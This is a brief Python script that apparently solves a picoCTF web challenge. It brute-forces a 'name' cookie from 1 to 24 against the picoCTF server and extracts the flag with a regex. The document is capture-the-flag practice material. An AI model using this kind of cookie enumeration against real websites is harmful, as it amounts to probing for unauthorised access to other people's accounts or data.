#!/usr/bin/env python3

import requests
import re

for i in range(1,25):
    cookies = {"name" : str(i)}
    web = "http://mercury.picoctf.net:29649/"
    response = requests.get(web, cookies=cookies).text
    if "I love" in response:
        pass
    else:
        flag = re.findall("<code>(.*)</code></p>", response)
        print("Correct cookie value is " + str(i) + "And the flag is " + "".join(flag))
